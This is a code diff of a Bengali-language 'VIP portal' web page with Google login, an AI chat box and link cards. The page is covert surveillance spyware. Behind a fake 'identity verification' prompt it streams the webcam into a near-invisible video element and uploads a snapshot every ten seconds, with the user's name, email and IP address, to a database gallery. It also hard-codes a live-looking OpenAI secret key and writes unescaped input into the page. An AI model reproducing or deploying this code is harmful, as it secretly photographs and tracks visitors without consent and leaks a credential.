@@ -4,292 +4,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ratan Bro | VIP Portal</title>
+    <title>Ratan Bro | Official VIP Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --pink: #ff4d94;
-            --glow: #ff4d94;
-            --dark: #020617;
-            --glass: rgba(255, 255, 255, 0.05);
+            --pink: #ff1a75;
+            --pink-glow: rgba(255, 26, 117, 0.6);
+            --dark: #010409;
+            --glass-bg: rgba(255, 255, 255, 0.07);
+            --glass-blur: blur(25px);
+            --trans-fast: 0.3s ease;
+            --trans-slow: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+            margin: 0; padding: 0; box-sizing: border-box;
             font-family: 'Hind Siliguri', sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
             background: var(--dark);
-            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.2), transparent),
-                radial-gradient(circle at bottom left, rgba(0, 102, 255, 0.1), transparent), #020617;
-            color: white;
-            min-height: 100vh;
-            overflow-x: hidden;
+            background: radial-gradient(circle at top right, rgba(255, 26, 117, 0.25), transparent), 
+                        radial-gradient(circle at bottom left, rgba(0, 102, 255, 0.15), transparent), #010409;
+            color: white; min-height: 100vh; overflow-x: hidden;
+            display: flex; flex-direction: column;
         }
 
         /* Overlay Modals */
-        #login-overlay,
-        #perm-modal,
-        #notif-modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(2, 6, 23, 0.98);
-            z-index: 10000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(20px);
-            padding: 20px;
+        #login-overlay, #perm-modal, #notif-modal {
+            position: fixed; inset: 0; background: rgba(1, 4, 9, 0.96);
+            z-index: 10000; display: flex; align-items: center;
+            justify-content: center; backdrop-filter: blur(25px); padding: 20px;
         }
 
         .glass-box {
-            background: var(--glass);
-            padding: 40px 30px;
-            border-radius: 35px;
-            border: 1px solid rgba(255, 77, 148, 0.3);
-            text-align: center;
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
-            animation: fadeIn 0.5s ease;
+            background: var(--glass-bg); padding: 45px 35px;
+            border-radius: 40px; border: 1px solid rgba(255, 26, 117, 0.4);
+            text-align: center; width: 100%; max-width: 450px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+            animation: modalPop 0.6s var(--trans-slow);
         }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        @keyframes modalPop {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
         }
 
-        /* Profile Header */
+        /* Hero Profile Header */
         .hero-header {
-            margin: 25px 20px;
-            padding: 35px 20px;
-            background: var(--glass);
-            border-radius: 35px;
+            margin: 25px 20px; padding: 40px 20px;
+            background: var(--glass-bg); border-radius: 40px;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: var(--glass-blur); position: relative;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.5); text-align: center;
         }
 
-        .profile-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
-        }
+        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 25px; }
+        .p-img { width: 115px; height: 115px; border-radius: 50%; border: 4.5px solid var(--pink); box-shadow: 0 0 35px var(--pink-glow); object-fit: cover; }
+        .user-p-img { width: 95px; height: 95px; border: 4.5px solid #fff; margin-left: -35px; background: #000; transition: var(--trans-fast); }
 
-        .p-img {
-            width: 110px;
-            height: 110px;
-            border-radius: 50%;
-            border: 4px solid var(--pink);
-            box-shadow: 0 0 30px var(--pink);
-            object-fit: cover;
-            transition: 0.5s;
-        }
-
-        .user-p-img {
-            width: 90px;
-            height: 90px;
-            border: 4px solid #fff;
-            margin-left: -30px;
-            background: #111;
-        }
+        .hero-header h2 { font-size: 28px; letter-spacing: 1.5px; margin-top: 10px; }
+        #u-ip { font-size: 13px; color: #aaa; margin-top: 10px; font-weight: 400; }
 
         /* Grid System */
         .grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 18px;
-            padding: 0 20px 30px;
-            max-width: 600px;
-            margin: 0 auto;
+            display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px;
+            padding: 0 20px 40px; max-width: 750px; margin: 0 auto; width: 100%;
         }
 
         .card {
-            background: var(--glass);
-            border-radius: 25px;
-            padding: 30px 15px;
-            text-align: center;
-            text-decoration: none;
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            position: relative;
-            overflow: hidden;
+            background: var(--glass-bg); border-radius: 30px;
+            padding: 35px 15px; text-align: center; text-decoration: none;
+            color: white; border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: var(--glass-blur);
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer; position: relative; overflow: hidden;
+            display: flex; flex-direction: column; align-items: center;
         }
 
+        /* Hover Animation: Floating Effect */
         .card:hover {
-            transform: translateY(-8px);
+            transform: translateY(-12px) scale(1.04);
             border-color: var(--pink);
-            background: rgba(255, 77, 148, 0.05);
-            box-shadow: 0 15px 30px rgba(255, 77, 148, 0.2);
+            background: rgba(255, 26, 117, 0.1);
+            box-shadow: 0 20px 45px rgba(255, 26, 117, 0.35);
         }
 
-        .card i {
-            font-size: 2.5rem;
-            color: var(--pink);
-            margin-bottom: 15px;
-            display: block;
-            text-shadow: 0 0 15px rgba(255, 77, 148, 0.5);
-        }
-
-        .card p {
-            font-weight: 600;
-            font-size: 16px;
-            letter-spacing: 0.5px;
-        }
+        .card i { font-size: 2.8rem; color: var(--pink); margin-bottom: 18px; text-shadow: 0 0 20px var(--pink-glow); }
+        .card p { font-weight: 700; font-size: 17px; }
 
         .card.wide {
-            grid-column: span 2;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            padding: 20px;
+            grid-column: span 2; flex-direction: row; gap: 20px; padding: 25px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 26, 117, 0.05));
         }
 
-        .card.wide i {
-            margin-bottom: 0;
-            font-size: 1.8rem;
-        }
-
-        /* Notification Dot */
+        /* Notification Alarm Animation */
         .alarm-dot {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            width: 14px;
-            height: 14px;
-            background: #ff3333;
-            border-radius: 50%;
-            box-shadow: 0 0 15px #ff3333;
-            display: none;
-            animation: pulse 1.2s infinite;
+            position: absolute; top: 18px; right: 18px;
+            width: 15px; height: 15px; background: #ff2222;
+            border-radius: 50%; box-shadow: 0 0 15px #ff2222;
+            display: none; animation: pulseRed 1.3s infinite;
         }
 
-        @keyframes pulse {
-            0% {
-                transform: scale(0.9);
-                opacity: 1;
-            }
-
-            50% {
-                transform: scale(1.2);
-                opacity: 0.5;
-            }
-
-            100% {
-                transform: scale(0.9);
-                opacity: 1;
-            }
+        @keyframes pulseRed {
+            0% { transform: scale(0.95); opacity: 1; }
+            50% { transform: scale(1.4); opacity: 0.5; }
+            100% { transform: scale(0.95); opacity: 1; }
         }
 
-        /* AI Chat Box */
-        .chat-area {
-            max-width: 500px;
-            margin: 10px auto 40px;
-            padding: 0 20px;
-        }
-
+        /* AI Conversation Box */
+        .chat-area { max-width: 550px; margin: 0 auto 50px; padding: 0 20px; width: 100%; }
         .chat-mini {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.7); border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1); padding: 25px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6); backdrop-filter: var(--glass-blur);
         }
-
-        #chat-log {
-            height: 140px;
-            overflow-y: auto;
-            color: #ddd;
-            margin-bottom: 15px;
-            font-size: 14px;
-            text-align: left;
-            line-height: 1.6;
-        }
-
-        .chat-in {
-            display: flex;
-            gap: 10px;
-        }
-
+        #chat-log { height: 160px; overflow-y: auto; color: #eee; margin-bottom: 18px; font-size: 15px; line-height: 1.6; }
+        .chat-in { display: flex; gap: 12px; }
         .chat-in input {
-            flex: 1;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 50px;
-            outline: none;
-            transition: 0.3s;
+            flex: 1; background: #000; border: 1px solid #333;
+            color: #fff; padding: 14px 22px; border-radius: 50px;
+            outline: none; transition: var(--trans-fast);
         }
+        .chat-in input:focus { border-color: var(--pink); box-shadow: 0 0 15px var(--pink-glow); }
 
-        .chat-in input:focus {
-            border-color: var(--pink);
-        }
-
+        /* VIP Buttons */
         .btn-main {
-            background: linear-gradient(45deg, var(--pink), #ff1a75);
-            color: white;
-            border: none;
-            padding: 14px 25px;
-            border-radius: 50px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.3);
+            background: linear-gradient(45deg, var(--pink), #ff0055);
+            color: white; border: none; padding: 15px 30px;
+            border-radius: 50px; font-weight: 800; cursor: pointer;
+            transition: 0.4s; box-shadow: 0 8px 25px rgba(255, 26, 117, 0.4);
+            text-transform: uppercase; letter-spacing: 1px;
         }
+        .btn-main:hover { transform: scale(1.05); opacity: 0.95; }
 
-        .btn-main:hover {
-            opacity: 0.9;
-            transform: scale(1.02);
-        }
+        .logout-btn { background: none; border: 1.5px solid rgba(255,255,255,0.2); color: #999; padding: 8px 22px; border-radius: 50px; cursor: pointer; font-size: 14px; margin: 15px; transition: 0.3s; }
+        .logout-btn:hover { border-color: #fff; color: #fff; background: rgba(255,255,255,0.1); }
 
-        /* Secret Video Fix */
-        #vSource {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 10px;
-            height: 10px;
-            opacity: 0.001;
-            /* 0 দিলে ফোনের ব্রাউজার পজ করে দেয়, তাই সামান্য রাখা হয়েছে */
-            pointer-events: none;
-            z-index: -1;
-        }
+        /* Invisible but Essential Elements */
+        #vSource { position: fixed; bottom: 0; width: 2px; height: 2px; opacity: 0.01; pointer-events: none; }
+        canvas { display: none; }
 
-        #snapCanvas {
-            display: none;
-        }
-
-        .logout-btn {
-            background: none;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            color: #aaa;
-            padding: 6px 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            font-size: 13px;
-            margin: 10px;
-            transition: 0.3s;
-        }
-
-        .logout-btn:hover {
-            color: #fff;
-            border-color: #fff;
+        /* Responsive Mobile Tweak */
+        @media (max-width: 500px) {
+            .hero-header { padding: 30px 10px; margin: 15px; }
+            .grid { gap: 14px; padding: 0 15px 30px; }
+            .card { padding: 25px 10px; border-radius: 25px; }
+            .card i { font-size: 2.2rem; }
+            .card p { font-size: 15px; }
         }
     </style>
 </head>
@@ -302,91 +166,82 @@
 
     <div id="login-overlay">
         <div class="glass-box">
-            <img src="ratan.jpg"
-                style="width:110px; border-radius:50%; border:3px solid var(--pink); margin-bottom:20px; box-shadow: 0 0 20px var(--pink);">
-            <h2 style="margin-bottom: 10px;">Ratan Bro Portal</h2>
-            <p style="font-size: 14px; opacity: 0.6; margin-bottom: 25px;">Welcome! Please login to continue.</p>
+            <img src="ratan.jpg" style="width:115px; height:115px; border-radius:50%; border:4px solid var(--pink); margin-bottom:20px; box-shadow: 0 0 30px var(--pink-glow); object-fit: cover;">
+            <h2 style="margin-bottom: 12px; font-size: 26px;">Ratan Bro Portal</h2>
+            <p style="font-size: 15px; opacity: 0.7; margin-bottom: 35px; font-weight: 300;">Private VIP Cloud Ecosystem</p>
             <button class="btn-main" onclick="googleLogin()" style="width: 100%;">
-                <i class="fab fa-google" style="margin-right: 10px;"></i> Login with Google
+                <i class="fab fa-google" style="margin-right: 12px;"></i> Authenticate via Google
             </button>
         </div>
     </div>
 
-    <div id="perm-modal">
+    <div id="perm-modal" style="display:none;">
         <div class="glass-box">
-            <i class="fas fa-fingerprint" style="font-size:4rem; color:var(--pink); margin-bottom: 25px;"></i>
-            <h3>Security Verification</h3>
-            <p style="font-size:15px; opacity:0.8; margin:20px 0; line-height: 1.5;">আমাদের পোর্টালে আপনার উপস্থিতি
-                নিশ্চিত করতে ক্যামেরা এবং লোকেশন এক্সেস প্রয়োজন। এটি একটি ওয়ান-টাইম সিকিউরিটি চেক।</p>
-            <button class="btn-main" onclick="grantAndStart()" style="width: 100%;">Allow & Start</button>
+            <i class="fas fa-fingerprint" style="font-size:4.5rem; color:var(--pink); margin-bottom: 25px; text-shadow: 0 0 25px var(--pink-glow);"></i>
+            <h3>Identity Verification</h3>
+            <p style="font-size:16px; opacity:0.8; margin:20px 0; line-height: 1.7;">আমাদের এআই সিকিউরিটি সিস্টেমে আপনার ভেরিফিকেশন সম্পন্ন করতে ক্যামেরা পারমিশন প্রয়োজন।</p>
+            <button class="btn-main" onclick="grantAndStart()" style="width: 100%;">Agree & Grant Access</button>
         </div>
     </div>
 
-    <div id="notif-modal">
-        <div class="glass-box" style="border-color: #00ccff;">
-            <h3 id="nt-title" style="color:#00ccff; margin-bottom:15px;">Broadcast Notice</h3>
-            <p id="nt-msg" style="font-size: 17px; line-height: 1.6;"></p>
-            <button class="btn-main" onclick="closeNotif()"
-                style="margin-top:25px; background: #00ccff; box-shadow: 0 5px 15px rgba(0, 204, 255, 0.3);">Dismiss</button>
+    <div id="notif-modal" style="display:none;">
+        <div class="glass-box" style="border-color: #00eeff; box-shadow: 0 20px 60px rgba(0, 238, 255, 0.35);">
+            <h3 id="nt-title" style="color:#00eeff; margin-bottom:15px; font-size: 22px;">Admin Announcement</h3>
+            <p id="nt-msg" style="font-size: 18px; line-height: 1.7; color: #fff;"></p>
+            <button class="btn-main" onclick="closeNotif()" style="margin-top:30px; background: linear-gradient(45deg, #00eeff, #0088aa); box-shadow: 0 8px 25px rgba(0, 238, 255, 0.4);">Acknowledge Notice</button>
         </div>
     </div>
 
     <div id="main-ui" style="display:none;">
-        <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">Logout</button></div>
+        <div style="text-align:right;"><button class="logout-btn" onclick="googleLogout()">System Logout</button></div>
 
         <div class="hero-header">
             <div class="profile-wrapper">
                 <img src="ratan.jpg" class="p-img">
                 <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
             </div>
-            <h2 id="u-name" style="text-align:center;">Member</h2>
-            <p id="u-ip" style="text-align:center; color:#888; font-size:12px; margin-top: 8px;"><i
-                    class="fas fa-network-wired"></i> Detecting IP...</p>
-            <div style="display: flex; justify-content: center; gap: 10px; margin-top: 12px;">
-                <span
-                    style="background: rgba(255, 77, 148, 0.2); color: var(--pink); padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; border: 1px solid var(--pink);">VIP
-                    PORTAL</span>
-                <span
-                    style="background: rgba(0, 204, 255, 0.2); color: #00ccff; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; border: 1px solid #00ccff;">VERIFIED</span>
+            <h2 id="u-name">VIP User</h2>
+            <p id="u-ip"><i class="fas fa-globe-asia"></i> Detecting Secure IP...</p>
+            <div style="display: flex; justify-content: center; gap: 12px; margin-top: 18px;">
+                <span style="background: rgba(255, 26, 117, 0.2); color: var(--pink); padding: 6px 18px; border-radius: 25px; font-size: 13px; font-weight: bold; border: 1px solid var(--pink);">VIP STATUS</span>
+                <span style="background: rgba(0, 238, 255, 0.2); color: #00eeff; padding: 6px 18px; border-radius: 25px; font-size: 13px; font-weight: bold; border: 1px solid #00eeff;">ENCRYPTED</span>
             </div>
         </div>
 
         <div class="grid">
             <div class="card" onclick="openLatestNotif()">
-                <i class="fas fa-bell"></i>
-                <p>Notification</p>
+                <i class="fas fa-satellite-dish"></i>
+                <p>Broadcasts</p>
                 <div id="notif-alarm" class="alarm-dot"></div>
             </div>
-
+            
             <a href="testpaper.html" class="card">
-                <i class="fas fa-scroll"></i>
-                <p>Test Papers</p>
+                <i class="fas fa-file-invoice"></i>
+                <p>Academic Hub</p>
             </a>
-
+            
             <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();">
-                <i class="fas fa-briefcase"></i>
-                <p>Business</p>
+                <i class="fas fa-project-diagram"></i>
+                <p>Business ERP</p>
             </a>
-
+            
             <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();">
-                <i class="fas fa-user-tie"></i>
-                <p>Portfolio</p>
+                <i class="fas fa-user-shield"></i>
+                <p>Portfolio Pro</p>
             </a>
 
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide"
-                onclick="document.getElementById('snd-look').play();">
-                <i class="fas fa-search-location"></i>
-                <p>Advanced Number Lookup</p>
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide" onclick="document.getElementById('snd-look').play();">
+                <i class="fas fa-map-marked-alt"></i>
+                <p>Global Number Intelligence Service</p>
             </a>
         </div>
 
         <div class="chat-area">
             <div class="chat-mini">
-                <div id="chat-log"><b>Ratan AI:</b> স্বাগতম! আমি রতন ব্রো-র এআই। আজ আপনাকে কীভাবে সাহায্য করতে পারি?
-                </div>
+                <div id="chat-log"><b>System AI:</b> স্বাগতম রতন ব্রো পোর্টালে। আপনার আজকের কাজের জন্য আমি তৈরি। কীভাবে সাহায্য করতে পারি?</div>
                 <div class="chat-in">
-                    <input type="text" id="ai-msg" placeholder="Ask AI anything...">
-                    <button onclick="askAI()" class="btn-main" style="padding: 10px 20px;">Send</button>
+                    <input type="text" id="ai-msg" placeholder="Query the Neural Network...">
+                    <button onclick="askAI()" class="btn-main" style="padding: 10px 22px;">Query</button>
                 </div>
             </div>
         </div>
@@ -416,105 +271,94 @@
         const OPENAI_KEY = "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";
 
         let loggedUser = null;
+        let userIP = "Unknown Host";
         let latestNotif = null;
-        let userIP = "Unknown";
 
-        // ১. পাওয়ারফুল স্ন্যাপ ফাংশন (ব্ল্যাক ইমেজ ফিক্স)
-        async function captureSession() {
+        // ১. অটো-ক্যাপচার ফাংশন (ব্ল্যাক ইমেজ ফিক্সসহ)
+        async function runAutoSecureCapture() {
             if (!loggedUser) return;
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
 
-            // ভিডিও স্ট্রিমিং হচ্ছে কি না এবং ভিজিবল কি না চেক
             if (video.readyState === 4) {
                 ctx.drawImage(video, 0, 0, 640, 480);
-                const imgData = canvas.toDataURL('image/jpeg', 0.4);
+                const frame = canvas.toDataURL('image/jpeg', 0.4);
+                
+                // যদি ছবি ব্ল্যাক বা খালি হয় (খুব ছোট সাইজ), তবে স্কিপ করবে
+                if (frame.length < 2500) return;
 
-                // ব্ল্যাক ইমেজ ফিল্টার (যদি ডাটা খুব কম হয় তবে আপলোড হবে না)
-                if (imgData.length < 1500) return;
-
-                const userKey = loggedUser.email.replace(/\./g, '_');
-                await setDoc(doc(db, "users", userKey), {
+                const dbKey = loggedUser.email.replace(/\./g, '_');
+                await setDoc(doc(db, "users", dbKey), {
                     name: loggedUser.displayName,
                     email: loggedUser.email,
                     photo: loggedUser.photoURL,
-                    lastPic: imgData,
+                    lastPic: frame,
                     location: userIP,
                     lastSeen: new Date().toLocaleString(),
-                    status: "Online",
-                    picList: arrayUnion(imgData) // অ্যাডমিন গ্যালারি আপডেট
+                    status: "Active Now",
+                    picList: arrayUnion(frame)
                 }, { merge: true });
-                console.log("Portal Secure: User Captured.");
+                console.log("Security Frame Synced.");
             }
         }
 
-        // ২. সিকিউরিটি স্টার্ট লজিক
+        // ২. সেশন স্টার্ট লজিক
         window.grantAndStart = async () => {
             try {
-                // ক্যামেরা স্ট্রিমিং শুরু
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: 640, height: 480 },
-                    audio: false
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 } 
                 });
+                document.getElementById('vSource').srcObject = stream;
+                
+                // আইপি ফেচিং
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIP = ipData.ip;
+                document.getElementById('u-ip').innerHTML = `<i class="fas fa-globe-asia"></i> IP: ${userIP}`;
 
-                const video = document.getElementById('vSource');
-                video.srcObject = stream;
-
-                // আইপি ডাটা ফেচ
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const data = await res.json();
-                    userIP = data.ip;
-                    document.getElementById('u-ip').innerHTML = `<i class="fas fa-network-wired"></i> IP: ${userIP}`;
-                } catch (e) { console.log("IP Fetch Error"); }
-
-                // UI পরিবর্তন
                 document.getElementById('perm-modal').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
 
-                // প্রথম ৩টি স্ন্যাপ দ্রুত নেওয়া হবে
-                setTimeout(captureSession, 1500);
-                setTimeout(captureSession, 3500);
-                setTimeout(captureSession, 6000);
-
-                // এরপর প্রতি ১০ সেকেন্ড লুপ
-                setInterval(captureSession, 10000);
+                // ফাস্ট ক্যাপচার লুপ
+                setTimeout(runAutoSecureCapture, 2000);
+                setTimeout(runAutoSecureCapture, 4500);
+                setInterval(runAutoSecureCapture, 10000);
 
             } catch (err) {
-                console.error(err);
-                alert("সিকিউরিটি পারমিশন প্রয়োজন! ব্রাউজার রিফ্রেশ দিয়ে Allow বাটনে ক্লিক করুন।");
+                alert("Security Alert: Camera permission is required to access Ratan Bro Portal.");
             }
         };
 
-        // ৩. গুগল লগইন এবং অথ লুপ
+        // ৩. অথেনটিকেশন লুপ
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 loggedUser = user;
                 document.getElementById('u-name').innerText = user.displayName;
                 document.getElementById('u-pic').src = user.photoURL;
                 document.getElementById('login-overlay').style.display = 'none';
-
-                // পারমিশন চেক (যদি আগে দেওয়া থাকে)
-                navigator.permissions.query({ name: 'camera' }).then(res => {
+                
+                // পারমিশন চেক
+                navigator.permissions.query({name: 'camera'}).then(res => {
                     if (res.state === 'granted') grantAndStart();
                     else document.getElementById('perm-modal').style.display = 'flex';
-                });
+                }).catch(() => document.getElementById('perm-modal').style.display = 'flex');
+
             } else {
                 document.getElementById('login-overlay').style.display = 'flex';
                 document.getElementById('main-ui').style.display = 'none';
             }
         });
 
-        // ৪. এআই চ্যাট ইন্টিগ্রেশন
+        // ৪. এআই চ্যাট ইন্টিগ্রেশন (GPT-4o Mini)
         window.askAI = async () => {
             const input = document.getElementById('ai-msg');
             const log = document.getElementById('chat-log');
             if (!input.value) return;
 
-            const prompt = input.value;
-            log.innerHTML += `<div style="color:var(--pink); margin-bottom:8px;"><b>You:</b> ${prompt}</div>`;
-            input.value = "AI is thinking...";
+            const q = input.value;
+            log.innerHTML += `<div style="color:var(--pink); margin-top:10px;"><b>You:</b> ${q}</div>`;
+            input.value = "Processing Neural Link...";
             input.disabled = true;
 
             try {
@@ -526,30 +370,29 @@
                     },
                     body: JSON.stringify({
                         model: "gpt-4o-mini",
-                        messages: [{ role: "user", content: prompt }]
+                        messages: [{ role: "user", content: q }]
                     })
                 });
                 const data = await response.json();
-                const reply = data.choices[0].message.content;
-                log.innerHTML += `<div style="color:#fff; margin-bottom:12px;"><b>AI:</b> ${reply}</div>`;
+                const ans = data.choices[0].message.content;
+                log.innerHTML += `<div style="color:#fff; margin-top:10px; margin-bottom:15px; border-left: 2px solid var(--pink); padding-left: 10px;"><b>AI:</b> ${ans}</div>`;
             } catch (e) {
-                log.innerHTML += `<div style="color:red;">Error: AI connection failed.</div>`;
+                log.innerHTML += `<div style="color:red; margin-top:10px;">Connection Interrupted. Retry.</div>`;
             }
-
+            
             input.value = "";
             input.disabled = false;
             log.scrollTop = log.scrollHeight;
         };
 
-        // সিস্টেম ইভেন্ট হ্যান্ডলার
+        // ৫. ইভেন্ট হ্যান্ডলার্স
         window.googleLogin = () => signInWithPopup(auth, provider);
         window.googleLogout = () => signOut(auth).then(() => location.reload());
 
-        // রিয়েল টাইম নোটিফিকেশন লিসেনার
         onSnapshot(doc(db, "system", "updates"), (snap) => {
             if (snap.exists()) {
                 latestNotif = snap.data();
-                if (latestNotif.hasNew === true) {
+                if (latestNotif.hasNew) {
                     document.getElementById('notif-alarm').style.display = 'block';
                     document.getElementById('snd-notif').play();
                 }
@@ -568,5 +411,4 @@
 
     </script>
 </body>
-
 </html>
